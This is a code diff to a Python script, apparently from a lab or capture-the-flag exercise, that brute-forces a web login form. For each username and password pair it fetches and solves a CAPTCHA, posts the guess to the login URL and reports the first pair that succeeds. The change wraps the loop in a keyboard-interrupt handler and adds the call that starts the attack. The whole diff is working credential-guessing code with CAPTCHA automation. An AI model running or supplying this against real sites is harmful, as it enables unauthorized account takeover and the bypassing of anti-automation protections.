@@ -35,21 +35,25 @@ with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
 def bruteforce(user, password):
     for username in user:
         for pswd in password:
-            while True:
-                _, attempt = getCaptcha()
-                data = {
-                    'username': username,
-                    'password': pswd,
-                    'captcha': attempt
-                }
-                response = session.post(loginURL, data=data)
-                login = (f"username: {username}, password: {pswd}, captcha: {attempt}")
-                if "CAPTCHA failed" in response.text:
-                    print(f"[-] {login}: captcha failure")
-                    continue
-                elif "Invalid username or password" in response.text:
-                    print(f"[-] {login}: wrong credentials")
-                    break
-                else:
-                    print(f"\n[+] {login}: successful attempt\n")
-                    return username, pswd
+            try:
+                while True:
+                    _, attempt = getCaptcha()
+                    data = {
+                        'username': username,
+                        'password': pswd,
+                        'captcha': attempt
+                    }
+                    response = session.post(loginURL, data=data)
+                    login = (f"username: {username}, password: {pswd}, captcha: {attempt}")
+                    if "CAPTCHA failed" in response.text:
+                        print(f"[-] {login}: captcha failure")
+                        continue
+                    elif "Invalid username or password" in response.text:
+                        print(f"[-] {login}: wrong credentials")
+                        break
+                    else:
+                        print(f"\n[+] {login}: successful attempt\n")
+                        return username, pswd
+            except KeyboardInterrupt:
+                print("\n[!] error: exiting program")
+bruteforce(username, passwords)
